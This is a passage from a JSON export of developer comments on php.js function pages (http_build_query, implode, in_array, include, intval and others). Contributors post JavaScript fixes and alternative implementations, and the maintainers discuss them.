21:41:03","author":"Michael White","url":"","comment":"One more little note:\r\n\r\nReplace:\r\n[CODE=&quot;JavaScript&quot;]\r\nuse_val = use_val.replace('%20', '+');\r\n[\/CODE]\r\n\r\nwith:\r\n[CODE=&quot;Javascript&quot;]\r\nuse_val = use_val.replace(\/%20\/g, '+');\r\n[\/CODE]\r\n\r\nThe original version only replaces a single instance of the string. Using the regular expression with \/g at the end tells it to replace &quot;globally&quot; meaning every instance of %20 in the string.\r\n\r\nhttp:\/\/crestidg.com"},{"date":"2008-03-03 11:46:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: fixed!"},{"date":"2008-03-14 02:29:20","author":"Michael White","url":"","comment":"Well I just found out that escape() is actually not the best thing to use for this function. encodeURIComponent() seems to be required here. The reason behind this is that a literal + sign does not get escaped by escape() and so gets &quot;lost in translation&quot; when working in PHP. I never would have discovered this if I had not been sending values that were either a + or - sign. I have no idea if there are any other characters affected by this at this time. My apologies to anyone who may be affected by this; I thought that escape() worked properly until now."},{"date":"2008-03-14 08:27:49","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: thanks for pointing that out Michael!"},{"date":"2008-03-14 17:28:21","author":"Michael White","url":"","comment":"No problem. Did you get my email from a couple of days ago? Also, I left a bugfix on the print_r() function that doesn't seem to have been noticed yet."},{"date":"2008-03-15 11:57:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Thanks for bringing it to my attention, yeah your mail is quite big so I saved it for this weekend ;) I'll get back to you today or tomorrow, cheers"},{"date":"2009-03-30 03:43:46","author":"stag019","url":"","comment":"This function fails to handle anything more than one deep, as well as it doesn't handle boolean values the way PHP does.\n\n[CODE]\nfunction http_build_query(formdata, numeric_prefix, arg_separator) {\n    var key, tmp = [],\n    _http_build_query_helper = function (key, val, arg_separator) {\n        var k, tmp = [];\n        if (val === true) {\n            val = \"1\";\n        }\n        else if (val === false) {\n            val = \"0\";\n        }\n        if (typeof(val) == \"array\" || typeof(val) == \"object\") {\n            for(k in val) {\n                if(val[k] !== null) {\n                    tmp.push(_http_build_query_helper(key + \"[\" + k + \"]\", val[k], arg_separator));\n                }\n            }\n            return tmp.join(arg_separator);\n        }\n        else if(typeof(val) != \"function\") {\n            return urlencode(key) + \"=\" + urlencode(val);\n        }\n    };\n    if (!arg_separator) {\n        arg_separator = \"&\";\n    }\n    for (key in formdata) {\n        if (numeric_prefix && !isNaN(key)) {\n            key = String(numeric_prefix) + key;\n        }\n        tmp.push(_http_build_query_helper(key, formdata[key], arg_separator));\n    }\n    return tmp.join(arg_separator);\n}\n[\/CODE]"},{"date":"2009-04-03 13:22:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ stag019: Nice! But I can only replace the current with your implementation if it doesn't break the second example (it does now)."},{"date":"2009-04-05 20:20:16","author":"stag019","url":"","comment":"D'oh.\n\nChange line 2 from \"var key, tmp = [],\" to \"var value, key, tmp = [],\".\nAdd \"value = formdata[key];\" under line 26.\nChange line 30 (or new line 31 if you've added the previous line from \"tmp.push(_http_build_query_helper(key, formdata[key], arg_separator));\" to \"tmp.push(_http_build_query_helper(key, value, arg_separator));\".\n\nThat should fix'er."},{"date":"2009-04-14 12:02:53","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Alright! Nice! Saved it in SVN and will be online & packaged shortly"},{"date":"2010-10-22 10:33:11","author":"Dreamer","url":"","comment":"Bug report: this.urlencode is not a function\n\nRelated to php.default.namespaced.min.js version 3.19\n\n[CODE]\nvar $P = new PHP_JS();\n$P.http_build_query({foo: 'bar'});\n[\/CODE]"},{"date":"2010-10-22 22:04:04","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Dreamer: Thanks for the report; should be fixed in Git: http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/url\/http_build_query.js . Let us know if that works..."},{"date":"2010-10-23 11:41:22","author":"Dreamer","url":"","comment":"@Brett Zamir: It works now."},{"date":"2011-11-07 12:43:14","author":"Click Button Publishing","url":"140plus.2et.in","comment":"We are using this code to format our URL and it is superb. Thanks phpJS :)"},{"date":"2012-05-12 11:04:41","author":"Tom ","url":"www.olivagreca.com","comment":"Hello guys,\nI am trying to produce a query string like:\n\/\/localhost:8080\/select\/?q=patata&model:journal+model:member+model:new_member+model:book\n\nBut when i am using the below code block i have an output like:\n\/\/localhost:8080\/select\/?q=patata&model:journal\n\nHow can i use repetitive pair values?\n\nThank you in advance\n \n[CODE]\n<script type=\"text\/javascript\">\nvar a = \"member\";\n\tvar b = \"new_member\";\n\t\tvar c = \"book\";\n\t\t\tvar d = \"journal\";\n\t\t\t\tvar e = \"cds\";\n\t\t\t\t\tvar f = \"pdfs\";\n\t\nfunction http_build_query (formdata, numeric_prefix, arg_separator) {\t\n    var value, key, tmp = [],\n        that = this;\n\n    var _http_build_query_helper = function (key, val, arg_separator) {\n        var k, tmp = [];\n        if (val === true) {\n            val = \"1\";\n        } else if (val === false) {\n            val = \"0\";\n        }\n        if (val != null) {\n            if(typeof(val) === \"object\") {\n                for (k in val) {\n                    if (val[k] != null) {\n                        tmp.push(_http_build_query_helper(key + \"[\" + k + \"]\", val[k], arg_separator));\n                    }\n                }\n                return tmp.join(arg_separator);\n            } else if (typeof(val) !== \"function\") {\n                return that.urlencode(key) + \":\" + that.urlencode(val);\n            } else {\n                throw new Error('There was an error processing for http_build_query().');\n            }\n        } else {\n            return '';\n        }\n    };\n\n    if (!arg_separator) {\n        arg_separator = \"&\";\n    }\n    for (key in formdata) {\n        value = formdata[key];\n        if (numeric_prefix && !isNaN(key)) {\n            key = String(numeric_prefix) + key;\n        }\n        var query=_http_build_query_helper(key, value, arg_separator);\n        if(query != '') {\n            tmp.push(query);\n        }\n    }\n\n    return tmp.join(arg_separator);\n}\n\nfunction urlencode (str) {\nstr = (str + '').toString();\n\n    \/\/ Tilde should be allowed unescaped in future versions of PHP (as reflected below), but if you want to reflect current\n    \/\/ PHP behavior, you would need to add \".replace(\/~\/g, '%7E');\" to the following.\n    return encodeURIComponent(str).replace(\/!\/g, '%21').replace(\/'\/g, '%27').replace(\/\\(\/g, '%28').\n    replace(\/\\)\/g, '%29').replace(\/\\*\/g, '%2A').replace(\/%20\/g, '+');\n}\n\t\n\nvar aa = http_build_query({'model': a, 'model': b, 'model': c, 'model': d}, '', '+');\n\tvar value= \"patata&\";\n\t\tvar qurl = \"\/\/localhost:8080\/select\/?q=\" + value + aa\n\t\t\nconsole.log(qurl);\n\n<\/script>\n[\/CODE]"},{"date":"2012-06-16 08:17:54","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Click Button Publishing: Glad to hear it is working for you! (I'm trying to help catch up on old messages one-by-one.)"}],"implode":[{"date":"2009-10-09 13:32:59","author":"Itsacon","url":"http:\/\/www.itsacon.net\/","comment":"This is a follow-up on the discussion at the array_diff() function.\r\n\r\nThe implode function is currently incompatible with most of the array_xxx() functions. Those functions often return objects instead of Arrays, but the implode() function actively checks for Arrays, and returns objects un-imploded.\r\n\r\nI made a slight alteration, parsing all object properties as well.\r\n\r\n[code]function implode(glue,pieces)\r\n{\r\n\tif(arguments.length == 1)\r\n\t{\r\n\t\tpieces = glue;\r\n\t\tglue = '';\r\n\t}\r\n\tif(typeof(pieces)=='object')\r\n\t{\r\n\t\tif(pieces instanceof Array)\r\n\t\t\treturn pieces.join(glue);\r\n\t\telse\r\n\t\t{\r\n\t\t\tretVal='', tGlue='';\r\n\t\t\tfor(i in pieces)\r\n\t\t\t{\r\n\t\t\t\tretVal += tGlue + pieces[i];\r\n\t\t\t\ttGlue = glue;\r\n\t\t\t}\r\n\t\t\treturn retVal;\r\n\t\t}\r\n\t}\r\n\telse\r\n\t{\r\n\t\treturn pieces;\r\n\t}\r\n}[\/code]\r\n\r\nI also made the function compatible with the PHP 4.3.0 alteration that made the glue parameter optional."},{"date":"2009-10-12 22:43:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Itsacon: Thanks very much! There may be a few other functions out there like that that only work with true arrays, so it is very good to have your fix. FYI, I declared retVal, tGlue, and i with 'var' so they would not be globals. It is now fixed in git: http:\/\/github.com\/kvz\/phpjs\/commit\/e00889a7914df1e91640b7222d56eee30c20ec97"},{"date":"2009-10-25 13:29:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Itsacon: Excellent!"},{"date":"2011-09-13 12:21:15","author":"Krrish","url":"http:\/\/itech.hubpages.com","comment":"Excellent Work... \nWell, I already developed one web 2.0 application (For Personal Use)... But Still having problems in mastering JavaScript (Especially JavaScript arrays)...\nBookmarked it for future reference.\nThanks"},{"date":"2011-09-14 10:56:36","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Glad you find the site helpful, Krrish. I recommend reading JavaScript: The Definitive Guide and JavaScript: The Good Parts."},{"date":"2011-09-19 11:12:14","author":"ionut","url":"http:\/\/ionutpopa.tumblr.com","comment":"Hi,\nWhy do you declare [code]tGlue = glue;[\/code] in the loop each time?"},{"date":"2011-09-19 20:42:23","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@ionut: It ensures that the first time in the loop it will use an empty string, but use the glue for subsequent loops."},{"date":"2012-08-01 11:35:06","author":"Marek Spak","url":"http:\/\/www.sanderundspak.de","comment":"or you could just use join on the array. like this\n\n[CODE]\n['hello','world','!!!'].join(' ') \/\/return \"hello world !!!\"\n[\/CODE]\n\nor am i missing something?"},{"date":"2012-09-18 17:29:30","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Marek Spak: That's basically what we're doing, with a little extra to cover the PHP API more exactly. See the Wiki\/FAQ for project goals."}],"import_request_variables":[{"date":"2009-08-14 07:13:58","author":"Stuart","url":"","comment":"Just want you guys to know that since this is not a normal PHP function you guys should document it better.\n\nfor instance, how do I:\n$_GET\n$_POST\n$_COOKIE\n\nAnd explain why its called by a function and not just done at window.onload.\n\nO and another thing, have the admin of this site add $_GET, $_POST, $_COOKIE in the function list and have it forward here because at first it seamed like these are missing and or are not possible with this library.\n\nLuckily I found it on another website.\n\n:) but any ways thanks for the time you placed in this one. This is a very important function."},{"date":"2009-08-16 18:08:51","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Stuart, Thanks for your comments.\n\n1) There is an example which shows how it works with cookies. The PHP documentation basically shows how it works otherwise, or if not, the source has to work as documentation until such time as volunteers may create documentation (though we're happy to address most questions if it's not clear). Admittedly in this case, this function involves our own (optional) custom behavior, so it does need a little more explaining to use it with all options.\n\nJavaScript can detect the current URL with its query string (window.location.href), so this function takes advantage of that. For $_COOKIE, we get it via document.cookie. As far as $_POST, you won't be able to implement this one, I think I can safely say, unless you're actually working with Server-Side JavaScript (not PHP). With HTML 5, we could perhaps use $_POST for messages submitted by another tab\/window, but that's a different story.\n\nAs far as why we don't do it during onload, there are two reasons:\n\n1) Kevin has wanted to stick to functions only.\n2) import_request_variables() function is not designed to replicate $_GET. It is more designed to control register_globals behavior. register_globals is deprecated and a bad idea, including if using this function, particular without a second argument, so we don't want to automatically run this function. That being said, the function allows you to use our own custom ini setting (ini_set() being a PHP function which we use for PHP ini settings and our own) to designate an object (instead of the global object, as in PHP) which can hold the request variables.\n\nSo, if you have \"?myvar=hello\" at the end of your URL, you can do the following:\n\n[CODE]\nini_set('phpjs.getVarsObj', $_GET = {}); \/\/ Only works in PHP.JS, not PHP (!), though by using ini_set(), it does work as though PHP.JS were an extension to PHP\nimport_request_variables('g'); \/\/ We only import $_GET here, but we don't add any prefix to the variable names since we used a more proper \"namespace\" via the ini_set() call above.\nalert($_GET['myvar']); \/\/ 'hello'\n[\/CODE]\n\nNote, however, that the (optional) non-PHP behavior of some PHP.JS functions is not guaranteed to remain stable; it's just a convenience, so that's why we don't spend much time documenting it (at least until it's tried out more).\n\nAnother option you\/we have is to allow some configuration in the namespaced version to set $_GET (or it would also work with the non-namespaced version if run to work in an anonymous namespace).\n"},{"date":"2009-08-22 17:11:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Stuart: \"have the admin of this site add $_GET, $_POST, $_COOKIE in the function list\".\n\nWell, no, because those are not functions. They're just global variables, something I'd rather not touch (at least not by default).\n\nFair enough: If you can achieve this with PHP.JS by going through some hoops like Brett pointed out; you are actively & intentionally bringing globals to your project and I can live with that.\n\nWhat I could do though is see if there's a better place to reference to Brett's solution for people who are craving; but like he said: I personally don't want to port or maintain anything else than just functions."},{"date":"2012-03-31 03:31:00","author":"Oria","url":"http:\/\/tablefield.com","comment":"Hi,\nIf I got it right - by default the requestObj is the globals?? run over all my global vars with the ones from cookies and url? that's really a bad idea... \nPHP had removed that feature, so I feel free to criticize it here as well :)\nIn any case requestObj should consider the ini_get('register_globals') and skip requestObj when this setting is off.\n\nI feel that by default it should either do nothing (like get and cookies are not populated by default). \nThough personally I would be really happy that by default this function will populate $_GET and $_COOKIES and $_REQUEST under the current namespace (even if it is this.window, because no one would ever use a var named exactly \"$_GET\" for any other use...)\n\nI suggest:\n[CODE]\nline 33: if (!_ini_get('register_globals')) requestObj=false;\nline 44: if (requestObj!==false && !requestObj[prefix + arrName]) {\nline 47: if (requestObj!==false) requestObj[prefix + arrName].push(current[1] || null);\nline 56: if (requestObj!==false) requestObj[prefix + current[0]] = current[1] || null;\nline 67:  if (requestObj!==false) requestObj[prefix + current[0]] = current[1].split(\";\")[0] || null;\n[\/CODE]\n"}],"in_array":[{"date":"2008-05-12 20:28:33","author":"Adam","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\n var found = false, key, strict = !!strict;\r\n[\/CODE]\r\n\r\nwhy are you defining strict to be NOT NOT strict ?"},{"date":"2008-05-12 22:51:47","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Adam: If I'm not mistaken this forces strict to be boolean. A single exclamation mark would indeed reverse it's meaning."},{"date":"2008-06-17 15:55:02","author":"peter","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction in_array(value, arr)\r\n{\r\nvar key;\r\nfor (key in arr)\r\n\t{\r\n        if (arr[key] === value)\r\n\t\t{return value; }\r\n        }\r\nreturn null; \/\/false\r\n}\r\n[\/CODE]"},{"date":"2008-06-18 17:26:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ peter: Thank you but according to the PHP manual in_array should return a boolean value. Also, your version doesn't support the optional strict argument, so in it's current form I'm not convinced I should replace our version with yours."},{"date":"2009-02-12 22:14:22","author":"Java Dude","url":"","comment":"Has this function been tested on Google Chrome?\r\n\r\nI am receiving a: Uncaught TypError when using it but on in Google Chrome."},{"date":"2009-02-15 15:42:54","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Java Dude: No but it has been tested (successfully) in Rhino and I believe Google based their js engine on that. \r\nDo you have more information (maybe a line number or something) for us to go on? Thanks in advance!"},{"date":"2009-04-05 13:39:05","author":"Vladimir Houba","url":"","comment":"function's preformance can be improoved by following\n[CODE]\n01.function in_array(needle, haystack, argStrict) {\n02.    \/\/ Checks if the given value exists in the array \n03.    \/\/\n04.    \/\/ version: 903.1614\n05.    \/\/ discuss at: http:\/\/phpjs.org\/functions\/in_array\n06.    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n07.    \/\/ *     example 1: in_array('van', ['Kevin', 'van', 'Zonneveld']);\n08.    \/\/ *     returns 1: true\n09.    var found = false, key, strict = !!argStrict;\n10. \n11.    for (key in haystack) {\n12.        if ((strict && haystack[key] === needle) || (!strict && haystack[key] == needle)) {\n13.            found = true;\n14.            break;\n15.        }\n16.    }\n \n    return found;\n}\n[\/CODE]"},{"date":"2009-04-05 15:04:05","author":"Brett Zamir","url":"","comment":"@Vladimir, it looks like you posted the same code as we currently have... One very small optimization I do see is \"return true\" and \"return false\" instead of found=true, etc. If your optimization was using indexOf, be aware that PHP.JS considers objects to be arrays, so we need to handle them as well..."},{"date":"2009-05-31 12:46:33","author":"vlado houba","url":"","comment":"sorry for posting that same content by mistake...\n\nmaybee it seems to be an unimporatnt change but i was working on a text analyzing script where things like this one matters a lot\n\nfor fast searching in small arrays i recommend using the value (string or number) as an index (for sure just for short values..), it much cuts the access times and can be used for advanced structures\n\n[CODE]\nfunction in_array(needle, haystack, argStrict)\n{\n\tvar found = new Boolean(false);\n\tvar key;\n\tvar strict = new Boolean(argStrict);\n\tif(strict)\n\t{\n\t\tfor (key in haystack)\n\t\t{\n\t\t\tif (haystack[key] === needle)\n\t\t\t{\n\t\t\t\tfound = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tfor (key in haystack)\n\t\t{\n\t\t\tif (haystack[key] == needle)\n\t\t\t{\n\t\t\t\tfound = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\treturn found;\n}\n[\/CODE]\n"},{"date":"2009-05-31 20:27:49","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ vlado houba: Yes using hash tables is really fast. Obviously we don't control our user's data. But we can make an effort to make in_array as fast as reasonably possible, and I see your optimization is not to check for strict every iteration, but check for it once, and use duplicated loops to do further processing.\n\nThough I'm a big fan of DRY, this really makes sense to me and justifies exception so I will implement your proposal. Thanks for sharing!"},{"date":"2009-09-22 18:17:21","author":"Drydenmaker","url":"","comment":"what if you flattened the non-strict side to a string and used a string search to avoid the loop.  Something like:\n\n[code]\n\nin_array: function (needle, haystack, argStrict) {\n            \n            var key = '', strict = !!argStrict;\n        \n            if (strict) {\n                for (key in haystack) {\n                    if (haystack[key] === needle) {\n                        return true;\n                    }\n                }\n            } else {\n\t\t\t\tif (this.is_string(needle)) {\n\t\t\t\t\tstr = haystack.toString();\n\t\t\t\t\treturn (str.search(needle) !== false)\n\t\t\t\t}\n\t\t\t\t\n                for (key in haystack) {\n                    if (haystack[key] == needle) {\n                        return true;\n                    }\n                }\n            }\n        \n            return false;\n        }\n\n[\/code]"},{"date":"2009-10-08 20:59:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Drydenmaker: Good point. Didn't bench it but obviously an internal function would be faster than anything we can hack.\n\nHowever your implementation relies on this.is_string which is not a php.js feature. \nI replaced it with (typeof(needle)=='string') but it seems that also the second test case (where we don't want to find 'vlado') fails.\nSo it needs a little bit of work still."},{"date":"2009-10-17 23:38:26","author":"Billy","url":"","comment":"Is it just me or does in_array(\"whatever\", [\"notit\"]) return true... \r\n\r\nThis function is majorly broken. Strings arguments always return true, even if the array is empty! "},{"date":"2009-10-18 06:49:30","author":"Theriault","url":"","comment":"I believe the  solution to the bug Billy found is that the native JavaScript String.prototype.search returns -1 if the needle is not found, not false like in PHP, what this function expects.\r\n\r\nAlso, turning an array into a string and searching for the needle, while faster, will be incorrect in many situations, such as searching for 'he' against ['the'] will return true, even though 'he' is not in the array."},{"date":"2009-10-18 07:03:04","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@billy: Thanks, fixed now in git: http:\/\/github.com\/kvz\/phpjs\/commit\/e37089b71ed1d32d1b4b4567c70a684c9d0e16f5\n\nSorry Drydenmaker and Kevin, it was a noble attempt, but search should be checked against -1, and even if that were corrected, there would still be problems as your version would make in_array('needle', ['needles']) return true."},{"date":"2009-11-26 11:06:18","author":"Jordi","url":"","comment":"Shorter:\n\n\t[CODE]\n\tfunction in_array (needle, haystack, argStrict) \n    {\n\t\tvar key = '', strict = !!argStrict;\n\n\t\tif (strict)\n\t\t\tfor (key in haystack)\n\t\t\t\tif ( (strict && haystack[key] === needle) ) || ( !strict && strict && haystack[key] == needle )\n\t\t\t\t\treturn true;\n\n\t\treturn false;\n\t}\n    [\/CODE]\n"},{"date":"2009-11-26 14:22:36","author":"Jordi","url":"","comment":"Of course that had to be:\n\n[CODE]\nfunction in_array (needle, haystack, argStrict) \n{\n    var key = '', strict = !!argStrict;\n\n    if (strict)\n        for (key in haystack)\n            if ( (strict && haystack[key] === needle) || ( !strict && strict && haystack[key] == needle ) )\n                return true;\n\n    return false;\n}\n[\/CODE]\n"},{"date":"2009-11-27 04:11:34","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jordi: Thanks for the submission. Kevin commented on this earlier that although he supports DRY (Don't Repeat Yourself), it is faster in this case to be longer, since with the way we have it now, there is only need to check the \"strict\" argument once. So, we will stick with the way it is. \n\nBtw, if you are using your version, you should drop the first \"if\" since it prevents dealing with non-strict cases.\n\nThanks again!"},{"date":"2011-01-05 12:03:27","author":"luigifab","url":"","comment":"Here a recursive function.\nBut, there is a problem with IE without the !isNaN(key).\n\n[code]\nfunction in_array(needle, haystack) {\n\n\tif ((needle === null) || (haystack === null))\n\t\treturn false;\n\n\tvar key = null;\n\n\tif (needle instanceof Array) {\n\t\tfor (key in needle) if (needle.hasOwnProperty(key)) {\n\t\t\tif (in_array(needle[key], haystack))\n\t\t\t\treturn true;\n\t\t}\n\t}\n\telse {\n\t\tfor (key in haystack) if (haystack.hasOwnProperty(key)) {\n\t\t\tif (!isNaN(key) && (haystack[key] === needle))\n\t\t\t\treturn true;\n\t\t}\n\t}\n\n\treturn false;\n}\n[\/code]"},{"date":"2011-01-05 13:33:26","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@luigifab: What problem are you referring to? Why would the key need to be a number? (php.js treats objects as associative arrays) What is the relation to IE?"},{"date":"2011-01-29 17:31:08","author":"luigifab","url":"","comment":"@Brett Zamir : There is a problem with array in IE if you use my function in_array without the !isNaN(key). That's it."},{"date":"2011-05-17 14:26:01","author":"callumacrae","url":"http:\/\/lynxphp.com\/","comment":"This might just be me being stupid, but:\n\nhttps:\/\/developer.mozilla.org\/en\/JavaScript\/Reference\/Global_Objects\/Array\/indexOf\n\nWhy not just force that to be boolean?"},{"date":"2011-05-17 21:02:25","author":"Theriault","url":"","comment":"@callumacrae: The indexOf method on the Array object is not supported by Internet Explorer. Also, the PHP JS function can handle Object."},{"date":"2011-08-15 23:34:43","author":"Mahbubur Rahman","url":"www.mahbubblog.com","comment":"People who are using jQuery in their project can use $.inArray which gives returns 1 when match is found and -1 when not found. "},{"date":"2012-07-15 21:11:27","author":"Abro - Lucido Media GbR","url":"http:\/\/lucido-media.de\/","comment":"Please consider using indexOf() [ see https:\/\/developer.mozilla.org\/en\/JavaScript\/Reference\/Global_Objects\/Array\/indexOf ] if available."}],"include":[{"date":"2008-01-08 16:28:53","author":"Legaev Andrey","url":"","comment":"include_once() function:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction include_once( filename ) {\r\n\tif (!window.php_js)\twindow.php_js = {};\r\n\tif (!window.php_js.includes)\twindow.php_js.includes = {};\r\n\t\r\n\tif (!window.php_js.includes[filename]) {\r\n\t\twindow.php_js.includes[filename] = 1;\r\n\t\tinclude_once( filename );\r\n\t}\r\n}\r\n[\/CODE]\r\n\r\nAnd small modification to include():\r\n[CODE=&quot;Javascript&quot;]\r\nfunction include( filename ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: mdsjack (http:\/\/www.mdsjack.bo.it)\r\n \r\n    var js = document.createElement('script');\r\n    js.setAttribute('type', 'text\/javascript');\r\n    js.setAttribute('src', filename);\r\n    js.setAttribute('defer', 'defer');\r\n    document.getElementsByTagName('HEAD')[0].appendChild(js);\r\n\t\r\n\tif (!window.php_js)\twindow.php_js = {};\r\n\tif (!window.php_js.includes)\twindow.php_js.includes = {};\r\n\t\r\n\tif (!window.php_js.includes[filename]) \r\n\t\twindow.php_js.includes[filename] = 1;\r\n\telse\r\n\t\twindow.php_js.includes[filename]++;\r\n}\r\n[\/CODE]"},{"date":"2008-01-08 17:24:49","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Legaev Andrey: Wow great contributions again!\r\n\r\nAt first I wanted every function to be standalone, but thinking about all the redundant code we would then get, I finally decided to add a: &quot;- depends on: include&quot; comment to include_once. I think we should stick to that approach.\r\n\r\nThanks!"},{"date":"2008-03-16 11:12:25","author":"mark forster","url":"","comment":"Why not check out owl import at http:\/\/code.google.com\/p\/owlimport\/. an alternative method of importing javascript files"},{"date":"2008-03-16 12:49:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ mark forster: The site's explanation isn't too elaborate, but I think I understand the idea. It's just like Java imports, right? I can imagine it being useful for many purposes, but I don't see how we would implement it in this project for two reasons:\r\n- it requires jQuery (an additional 15kB) for only 1 functionality that\r\n- resembles Java, not php"}],"include_once":[{"date":"2012-02-28 07:19:30","author":"Nitin Balsaraf","url":"","comment":"How can i include Validation.php file in javascript and also have to call validate( with some parameters) function from javascript. I have to pass parameters from javascript to validate function.\nHow to do this please suggest me?????"}],"intval":[{"date":"2008-05-14 04:27:38","author":"stensi","url":"","comment":"Just stumbled across your PHP.js library, awesome work Kevin :)\r\n\r\nI think your intval could be improved a little to handle JavaScripts &quot;Infinity&quot; value better.\r\n\r\nFor example, using current PHP.js intval:\r\n[code]\r\nfunction intval( mixed_var, base ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ *     example 1: intval('Kevin van Zonneveld');\r\n    \/\/ *     returns 1: 0\r\n    \/\/ *     example 2: intval(4.2);\r\n    \/\/ *     returns 2: 4\r\n    \/\/ *     example 3: intval(42, 8);\r\n    \/\/ *     returns 3: 42\r\n \r\n    var tmp;\r\n \r\n    if( typeof( mixed_var ) == 'string' ){\r\n        tmp = parseInt(mixed_var);\r\n        if(isNaN(tmp)){\r\n            return 0;\r\n        } else{\r\n            return tmp.toString(base || 10);\r\n        }\r\n    } else if( typeof( mixed_var ) == 'number' ){\r\n        return Math.floor(mixed_var);\r\n    } else{\r\n        return 0;\r\n    }\r\n}\r\n\r\n\/\/ set num to: Infinity\r\nvar num = 1 \/ 0;\r\n\r\n\/\/ using current PHP.js intval returns: Infinity\r\nalert( intval(num) );\r\n\r\n\/\/ Output: Infinity\r\n[\/code]\r\n\r\n\r\nUsing modified intval to handle Infinity:\r\n[code]\r\nfunction intval( mixed_var, base ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ *     example 1: intval('Kevin van Zonneveld');\r\n    \/\/ *     returns 1: 0\r\n    \/\/ *     example 2: intval(4.2);\r\n    \/\/ *     returns 2: 4\r\n    \/\/ *     example 3: intval(42, 8);\r\n    \/\/ *     returns 3: 42\r\n \r\n    var tmp;\r\n \r\n    if( typeof( mixed_var ) == 'string' ){\r\n        tmp = parseInt(mixed_var);\r\n        if(isNaN(tmp) || !isFinite(tmp)){\r\n            return 0;\r\n        } else{\r\n            return tmp.toString(base || 10);\r\n        }\r\n    } else if( typeof( mixed_var ) == 'number' &amp;&amp; isFinite(mixed_var) ){\r\n        return Math.floor(mixed_var);\r\n    } else{\r\n        return 0;\r\n    }\r\n}\r\n\r\n\/\/ set num to: Infinity\r\nvar num = 1 \/ 0;\r\n\r\n\/\/ using intval_modified to handle Infinity returns: 0\r\nalert( intval_modified(num) );\r\n\r\n\/\/ Output: 0\r\n[\/code]\r\n\r\nBasically, the changes are:\r\n[code]if(isNaN(tmp)){[\/code]\r\nto:\r\n[code]if(isNaN(tmp) || !isFinite(tmp)){[\/code]\r\n\r\nand...\r\n\r\n[code]} else if( typeof( mixed_var ) == 'number' ){[\/code]\r\nto:\r\n[code]} else if( typeof( mixed_var ) == 'number' &amp;&amp; isFinite(mixed_var) ){[\/code]"},{"date":"2008-05-14 04:29:49","author":"stensi","url":"","comment":"Just stumbled across your PHP.js library, awesome work Kevin :)\r\n\r\nI think your intval could be improved a little to handle JavaScripts &quot;Infinity&quot; value.\r\n\r\nfor example, using current PHP.js intval:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction intval( mixed_var, base ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ *     example 1: intval('Kevin van Zonneveld');\r\n    \/\/ *     returns 1: 0\r\n    \/\/ *     example 2: intval(4.2);\r\n    \/\/ *     returns 2: 4\r\n    \/\/ *     example 3: intval(42, 8);\r\n    \/\/ *     returns 3: 42\r\n \r\n    var tmp;\r\n \r\n    if( typeof( mixed_var ) == 'string' ){\r\n        tmp = parseInt(mixed_var);\r\n        if(isNaN(tmp)){\r\n            return 0;\r\n        } else{\r\n            return tmp.toString(base || 10);\r\n        }\r\n    } else if( typeof( mixed_var ) == 'number' ){\r\n        return Math.floor(mixed_var);\r\n    } else{\r\n        return 0;\r\n    }\r\n}\r\n\r\n\/\/ set num to: Infinity\r\nvar num = 1 \/ 0;\r\n\r\n\/\/ using current PHP.js intval returns: Infinity\r\nalert( intval(num) );\r\n\r\n\/\/ Output: Infinity\r\n[\/CODE]\r\n\r\n\r\nUsing modified intval to handle Infinity:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction intval( mixed_var, base ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ *     example 1: intval('Kevin van Zonneveld');\r\n    \/\/ *     returns 1: 0\r\n    \/\/ *     example 2: intval(4.2);\r\n    \/\/ *     returns 2: 4\r\n    \/\/ *     example 3: intval(42, 